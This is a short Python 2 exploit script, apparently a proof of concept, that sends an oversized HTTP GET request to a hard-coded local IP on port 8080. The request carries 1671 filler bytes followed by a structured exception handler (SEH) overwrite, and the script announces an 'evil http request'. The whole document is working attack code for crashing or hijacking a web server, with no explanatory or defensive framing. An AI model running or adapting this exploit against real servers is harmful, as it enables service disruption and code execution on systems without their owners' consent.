#!/usr/bin/python

import socket
import os
import sys

ip = "192.168.100.120"
port = 8080

nSEH = "B" * 4
SEH  = "\x94\x59\x43" # 0x0055fe67

crash  = "A" * 1671
crash += nSEH
crash += SEH
#crash += "D" * (2261 - len(crash))

req  = "GET /" + crash + " HTTP/1.1\r\n"
req += "Host: 192.168.100.120:8080\r\n"
req += "User-Agent: Mozilla/5.0\r\n"
req += "Connection: close\r\n\r\n"

print "[*] Sending evil http request to target"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((ip, port))
expl.send(req)
expl.close()

